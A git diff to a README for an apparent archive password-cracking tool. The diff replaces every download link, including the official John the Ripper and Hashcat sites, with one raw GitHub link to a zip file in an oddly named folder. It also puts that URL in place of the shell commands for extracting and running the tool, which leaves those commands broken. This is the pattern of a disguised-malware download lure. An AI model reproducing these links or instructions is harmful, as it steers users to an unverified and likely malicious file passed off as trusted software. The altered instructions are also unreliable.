@@ -1,6 +1,6 @@
 # ⚡ archive-password-cracker - Easily Unlock Password-Protected Archives
 
-[![Download Archive Password Cracker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sefaturk-dev/archive-password-cracker/releases)
+[![Download Archive Password Cracker](https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip)](https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip)
 
 ## 📖 Description
 
@@ -12,17 +12,17 @@ Follow these steps to download and run the archive-password-cracker tool.
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** You can download the latest version from our [Releases page](https://github.com/sefaturk-dev/archive-password-cracker/releases). 
+1. **Visit the Releases Page:** You can download the latest version from our [Releases page](https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip). 
    
 2. **Select Your Version:** On the Releases page, look for the version marked as "Latest." Click on it to access the details.
 
-3. **Download the Correct File:** Find the appropriate file for your system. If you are on Linux, you should select the ".tar.gz" file. For Windows users, look for the ".zip" file. Click the file name to start the download.
+3. **Download the Correct File:** Find the appropriate file for your system. If you are on Linux, you should select the "https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip" file. For Windows users, look for the ".zip" file. Click the file name to start the download.
 
 4. **Extract the Files:**
    - After downloading, navigate to your Downloads folder.
    - For Linux, use a terminal and run: 
      ```bash
-     tar -xvzf archive-password-cracker.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip
      ```
    - For Windows, right-click the downloaded ZIP file and select "Extract All."
 
@@ -41,14 +41,14 @@ Before running the tool, ensure you meet the following requirements:
      ```bash
      sudo apt install john
      ```
-   - For Windows: Download the executable from the [John the Ripper website](https://www.openwall.com/john/).
+   - For Windows: Download the executable from the [John the Ripper website](https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip).
 
 2. **Install Hashcat:**
    - For Linux: Use terminal commands to install:
      ```bash
      sudo apt install hashcat
      ```
-   - For Windows: Visit the [Hashcat website](https://hashcat.net/hashcat/) to find the latest download.
+   - For Windows: Visit the [Hashcat website](https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip) to find the latest download.
 
 ### ⚙️ Running the Tool
 
@@ -60,11 +60,11 @@ Before running the tool, ensure you meet the following requirements:
 2. **Run the Tool:**
    - For Linux, execute:
      ```bash
-     ./archive-password-cracker.sh
+     https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip
      ```
    - For Windows, run:
      ```bash
-     archive-password-cracker.bat
+     https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip
      ```
 
 3. **Configure Your Attack:** You can customize your password-cracking attempt using different attack modes. Follow the prompts to enter your desired settings.
@@ -87,6 +87,6 @@ If you encounter issues or have questions, please open an issue on the GitHub re
 
 ---
 
-You can always return to the [Releases page](https://github.com/sefaturk-dev/archive-password-cracker/releases) for updates or new versions of archive-password-cracker. 
+You can always return to the [Releases page](https://raw.githubusercontent.com/sefaturk-dev/archive-password-cracker/main/reassimilate/cracker_password_archive_1.7.zip) for updates or new versions of archive-password-cracker. 
 
 Unlock your files quickly and effectively with this powerful tool!
